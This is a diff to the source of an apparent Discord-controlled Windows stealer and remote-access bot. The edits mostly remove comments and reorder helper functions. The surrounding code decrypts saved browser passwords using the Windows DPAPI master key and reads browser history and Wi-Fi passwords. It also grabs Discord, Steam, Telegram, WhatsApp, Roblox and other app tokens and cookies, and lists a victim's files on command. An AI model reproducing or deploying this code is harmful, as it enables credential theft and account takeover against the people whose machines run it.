@@ -35,13 +35,11 @@ import certifi
 import ssl
 import tempfile
 
-# Fix SSL for PyInstaller bundled EXE
 if getattr(sys, 'frozen', False):
     os.environ['SSL_CERT_FILE'] = certifi.where()
     os.environ['REQUESTS_CA_BUNDLE'] = certifi.where()
     ssl._create_default_https_context = ssl._create_unverified_context
 
-# PyCryptodome - handle gracefully if missing
 try:
     from Crypto.Cipher import AES
     CRYPTO_AVAILABLE = True
@@ -49,7 +47,6 @@ except ImportError:
     CRYPTO_AVAILABLE = False
     AES = None
 
-# PyAudio - optional, handle gracefully if missing
 try:
     import pyaudio
     import wave
@@ -210,9 +207,7 @@ def get_wifipasswords():
         pass
     return profiles
 
-# ========== FOLDER HELPERS ==========
 def get_folder_path(folder_name):
-    """Get actual Windows folder path (handles OneDrive)"""
     folder_map = {
         'downloads': "{374DE290-123F-4565-9164-39C4925E467B}",
         'documents': "Personal",
@@ -221,7 +216,6 @@ def get_folder_path(folder_name):
         'videos': "My Video",
         'desktop': "Desktop"
     }
-    
     try:
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders")
         path = winreg.QueryValueEx(key, folder_map[folder_name])[0]
@@ -230,32 +224,26 @@ def get_folder_path(folder_name):
             return path
     except:
         pass
-    
     return os.path.join(os.path.expanduser('~'), folder_name.capitalize())
 
-# ========== BROWSER HISTORY ==========
 def get_browser_history(browser_name, history_db_path):
     history = []
     try:
         if not os.path.exists(history_db_path):
             return []
-        
         temp_db = os.path.join(tempfile.gettempdir(), f"{browser_name}_history.db")
         shutil.copy2(history_db_path, temp_db)
-        
         conn = sqlite3.connect(temp_db)
         cursor = conn.cursor()
         try:
             cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
         except:
             cursor.execute("SELECT url, title, visit_time FROM visits ORDER BY visit_time DESC LIMIT 50")
-        
         for row in cursor.fetchall():
             if len(row) >= 2:
                 url = row[0]
                 title = row[1] if row[1] else "No Title"
                 history.append(f"📄 {title}\n🔗 {url}\n")
-        
         conn.close()
         os.remove(temp_db)
         return history
@@ -265,7 +253,6 @@ def get_browser_history(browser_name, history_db_path):
 def get_all_browser_history():
     all_history = []
     detected = []
-    
     browsers = {
         "Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\History",
         "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Default\History",
@@ -273,7 +260,6 @@ def get_all_browser_history():
         "Opera": os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable\History",
         "Vivaldi": os.path.expanduser("~") + r"\AppData\Local\Vivaldi\User Data\Default\History"
     }
-    
     for name, path in browsers.items():
         if os.path.exists(path):
             detected.append(name)
@@ -282,40 +268,30 @@ def get_all_browser_history():
                 all_history.append(f"**{name} History:**")
                 all_history.extend(history[:20])
                 all_history.append("-" * 40)
-    
     return all_history, detected
 
-# ========== BROWSER PASSWORDS ==========
 def get_browser_passwords(browser_name, user_data_path):
     passwords = []
     try:
         if not CRYPTO_AVAILABLE:
             return ["pycryptodome not installed"]
-        
         local_state_path = os.path.join(user_data_path, "Local State")
         if not os.path.exists(local_state_path):
             return []
-        
         with open(local_state_path, 'r', encoding='utf-8') as f:
             local_state = json.load(f)
-        
         encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
         master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-        
         profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]
-        
         for profile in profiles:
             login_db = os.path.join(user_data_path, profile, "Login Data")
             if not os.path.exists(login_db):
                 continue
-            
             temp_db = os.environ['TEMP'] + f"\\{browser_name}_login.db"
             shutil.copy2(login_db, temp_db)
-            
             conn = sqlite3.connect(temp_db)
             cursor = conn.cursor()
             cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-            
             for url, username, encrypted_pass in cursor.fetchall():
                 if encrypted_pass:
                     try:
@@ -328,7 +304,6 @@ def get_browser_passwords(browser_name, user_data_path):
                         pass
             conn.close()
             os.remove(temp_db)
-        
         return passwords
     except:
         return []
@@ -336,7 +311,6 @@ def get_browser_passwords(browser_name, user_data_path):
 def get_all_browser_passwords():
     all_passwords = []
     detected = []
-    
     browsers = {
         "Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data",
         "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data",
@@ -344,28 +318,22 @@ def get_all_browser_passwords():
         "Opera": os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable",
         "Vivaldi": os.path.expanduser("~") + r"\AppData\Local\Vivaldi\User Data"
     }
-    
     for name, path in browsers.items():
         if os.path.exists(path):
             detected.append(name)
             passwords = get_browser_passwords(name, path)
             all_passwords.extend(passwords)
-    
     return all_passwords, detected
 
-# ========== TOKEN GRABBER ==========
 def grab_all_tokens():
     tokens = []
     detected_apps = []
-    
-    # Discord
     discord_paths = [
         os.path.expanduser("~") + r"\AppData\Roaming\Discord\Local Storage\leveldb",
         os.path.expanduser("~") + r"\AppData\Roaming\DiscordPTB\Local Storage\leveldb",
         os.path.expanduser("~") + r"\AppData\Roaming\DiscordCanary\Local Storage\leveldb",
         os.path.expanduser("~") + r"\AppData\Roaming\Lightcord\Local Storage\leveldb",
     ]
-    
     for path in discord_paths:
         if os.path.exists(path):
             detected_apps.append("Discord")
@@ -382,8 +350,6 @@ def grab_all_tokens():
                                 tokens.append(f"🟣 Discord MFA: {match}")
             except:
                 pass
-    
-    # Chrome cookies
     chrome_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default"
     if os.path.exists(chrome_path):
         detected_apps.append("Chrome")
@@ -402,8 +368,6 @@ def grab_all_tokens():
                 os.remove(temp_db)
         except:
             pass
-    
-    # Steam
     steam_path = os.path.expanduser("~") + r"\AppData\Local\Steam\config\loginusers.vdf"
     if os.path.exists(steam_path):
         detected_apps.append("Steam")
@@ -418,8 +382,6 @@ def grab_all_tokens():
                     tokens.append(f"🎮 Steam ID: {match}")
         except:
             pass
-    
-    # Epic Games
     epic_path = os.path.expanduser("~") + r"\AppData\Local\Epic Games\Launcher\Saved\Config\Windows\GameUserSettings.ini"
     if os.path.exists(epic_path):
         detected_apps.append("Epic Games")
@@ -431,8 +393,6 @@ def grab_all_tokens():
                     tokens.append(f"🎯 Epic Games: {match}")
         except:
             pass
-    
-    # Minecraft
     mc_paths = [
         os.path.expanduser("~") + r"\AppData\Roaming\.minecraft\launcher_profiles.json",
         os.path.expanduser("~") + r"\AppData\Roaming\.minecraft\usercache.json"
@@ -451,8 +411,6 @@ def grab_all_tokens():
                         tokens.append(f"⛏️ Minecraft UUID: {match}")
             except:
                 pass
-    
-    # Spotify
     spotify_path = os.path.expanduser("~") + r"\AppData\Roaming\Spotify\Users"
     if os.path.exists(spotify_path):
         detected_apps.append("Spotify")
@@ -466,8 +424,6 @@ def grab_all_tokens():
                             tokens.append(f"🎵 Spotify: {match[:30]}...")
         except:
             pass
-    
-    # Riot Games
     riot_path = os.path.expanduser("~") + r"\AppData\Local\Riot Games\Riot Client\Data"
     if os.path.exists(riot_path):
         detected_apps.append("Riot Games")
@@ -483,8 +439,6 @@ def grab_all_tokens():
                                     tokens.append(f"🏹 Riot Games: {match[:30]}...")
         except:
             pass
-    
-    # Roblox
     roblox_path = os.path.expanduser("~") + r"\AppData\Local\Roblox\Local Storage\leveldb"
     if os.path.exists(roblox_path):
         detected_apps.append("Roblox")
@@ -498,8 +452,6 @@ def grab_all_tokens():
                             tokens.append(f"🧱 Roblox: {match[:30]}...")
         except:
             pass
-    
-    # Reddit
     reddit_path = os.path.expanduser("~") + r"\AppData\Roaming\Reddit\Local Storage\leveldb"
     if os.path.exists(reddit_path):
         detected_apps.append("Reddit")
@@ -513,8 +465,6 @@ def grab_all_tokens():
                             tokens.append(f"🔴 Reddit: {match[:30]}...")
         except:
             pass
-    
-    # TikTok
     tiktok_path = os.path.expanduser("~") + r"\AppData\Roaming\TikTok\Local Storage\leveldb"
     if os.path.exists(tiktok_path):
         detected_apps.append("TikTok")
@@ -528,8 +478,6 @@ def grab_all_tokens():
                             tokens.append(f"🎵 TikTok: {match[:30]}...")
         except:
             pass
-    
-    # Battle.net
     battlenet_path = os.path.expanduser("~") + r"\AppData\Local\Battle.net\Blizzard\Local Storage\leveldb"
     if os.path.exists(battlenet_path):
         detected_apps.append("Battle.net")
@@ -543,8 +491,6 @@ def grab_all_tokens():
                             tokens.append(f"🎮 Battle.net: {match[:30]}...")
         except:
             pass
-    
-    # Telegram
     telegram_paths = [
         os.path.expanduser("~") + r"\AppData\Roaming\Telegram Desktop\tdata",
         os.path.expanduser("~") + r"\AppData\Roaming\Telegram Desktop\tdummy"
@@ -562,8 +508,6 @@ def grab_all_tokens():
                                 tokens.append(f"🔵 Telegram: {match.decode('utf-8', errors='ignore')}")
             except:
                 pass
-    
-    # WhatsApp
     wa_path = os.path.expanduser("~") + r"\AppData\Roaming\WhatsApp\Local Storage\leveldb"
     if os.path.exists(wa_path):
         detected_apps.append("WhatsApp")
@@ -577,7 +521,6 @@ def grab_all_tokens():
                             tokens.append(f"💬 WhatsApp: {match[:30]}...")
         except:
             pass
-    
     return tokens, list(set(detected_apps))
 
 def get_idle_time():
@@ -779,20 +722,6 @@ def get_installed_programs():
     except:
         return ["Error getting installed programs"]
 
-def is_authorized():
-    async def auth(ctx):
-        if ctx.author.id in Config.WHITELISTED:
-            return True
-        embed = discord.Embed(title="Access Denied", color=discord.Color.red())
-        await ctx.send(embed=embed)
-        return False
-    return commands.check(auth)
-
-async def send_embed(ctx, title, description, color=discord.Color.blue()):
-    embed = discord.Embed(title=title, description=description, color=color)
-    await ctx.send(embed=embed)
-
-# ========== FILE EMOJI HELPER ==========
 def get_file_emoji(filename):
     ext = os.path.splitext(filename)[1].lower()
     emoji_map = {
@@ -810,7 +739,18 @@ def get_file_emoji(filename):
     }
     return emoji_map.get(ext, '📄')
 
-# ========== COMMANDS ==========
+def is_authorized():
+    async def auth(ctx):
+        if ctx.author.id in Config.WHITELISTED:
+            return True
+        embed = discord.Embed(title="Access Denied", color=discord.Color.red())
+        await ctx.send(embed=embed)
+        return False
+    return commands.check(auth)
+
+async def send_embed(ctx, title, description, color=discord.Color.blue()):
+    embed = discord.Embed(title=title, description=description, color=color)
+    await ctx.send(embed=embed)
 
 @bot.event
 async def on_ready():
@@ -1102,7 +1042,7 @@ async def media_next(ctx):
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
-# ========== FILE LISTING ==========
+# ========== FIXED FILE LISTING ==========
 @bot.command(name='listfiles')
 @is_authorized()
 async def list_files(ctx, directory: str = "."):
@@ -1183,11 +1123,11 @@ async def list_files(ctx, directory: str = "."):
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
-# ========== FILTERED LISTINGS ==========
+# ========== IMAGES ONLY ==========
 @bot.command(name='images')
 @is_authorized()
 async def list_images(ctx, directory: str = "."):
-    """List only image files (jpg, png, gif, bmp, webp, etc.)"""
+    """List only image files (jpg, png, gif, webp, bmp, ico, svg, tiff)"""
     try:
         if directory.startswith("~"):
             directory = os.path.expanduser(directory)
@@ -1222,7 +1162,6 @@ async def list_images(ctx, directory: str = "."):
             await send_embed(ctx, f"📁 {directory}", "No images found", discord.Color.orange())
             return
         
-        # Split into chunks if needed
         output = "\n".join(images[:50])
         if len(output) > 1900:
             output = output[:1900] + "..."
@@ -1230,10 +1169,11 @@ async def list_images(ctx, directory: str = "."):
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
+# ========== VIDS ONLY ==========
 @bot.command(name='vids')
 @is_authorized()
 async def list_videos_only(ctx, directory: str = "."):
-    """List only video files (mp4, avi, mkv, mov, etc.)"""
+    """List only video files (mp4, avi, mkv, mov, wmv, flv, webm, m4v)"""
     try:
         if directory.startswith("~"):
             directory = os.path.expanduser(directory)
@@ -1273,10 +1213,11 @@ async def list_videos_only(ctx, directory: str = "."):
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
+# ========== AUDIO ONLY ==========
 @bot.command(name='audio')
 @is_authorized()
 async def list_audio_only(ctx, directory: str = "."):
-    """List only audio files (mp3, wav, flac, etc.)"""
+    """List only audio files (mp3, wav, flac, aac, ogg, wma, m4a, opus)"""
     try:
         if directory.startswith("~"):
             directory = os.path.expanduser(directory)
@@ -1316,6 +1257,7 @@ async def list_audio_only(ctx, directory: str = "."):
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
+# ========== SEARCH ==========
 @bot.command(name='search')
 @is_authorized()
 async def search_files(ctx, *, query: str):
@@ -1350,6 +1292,7 @@ async def search_files(ctx, *, query: str):
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
+# ========== RECENT ==========
 @bot.command(name='recent')
 @is_authorized()
 async def recent_files(ctx, count: int = 15):
@@ -1756,7 +1699,7 @@ async def browser_history(ctx):
     else:
         await send_embed(ctx, "History", "No browser history found", discord.Color.red())
 
-# ========== FOLDER COMMANDS WITH PATH SUPPORT ==========
+# ========== FOLDER COMMANDS ==========
 @bot.command(name='pictures')
 @is_authorized()
 async def pictures_cmd(ctx, *, path: str = ""):
@@ -2253,8 +2196,8 @@ async def help_cmd(ctx):
             "`installed` - List installed programs",
             "`search <query>` - Search for files",
             "`recent` - Show recently modified files",
-            "`images` - Show only image files",
-            "`vids` - Show only video files (mp4, avi, mkv, mov, etc.)",
+            "`images` - Show only image files (jpg, png, gif, webp, bmp)",
+            "`vids` - Show only video files (mp4, avi, mkv, mov)",
             "`audio` - Show only audio files (mp3, wav, flac)",
             "`programfiles` - C:\\Program Files",
             "`programfilesx86` - C:\\Program Files (x86)",
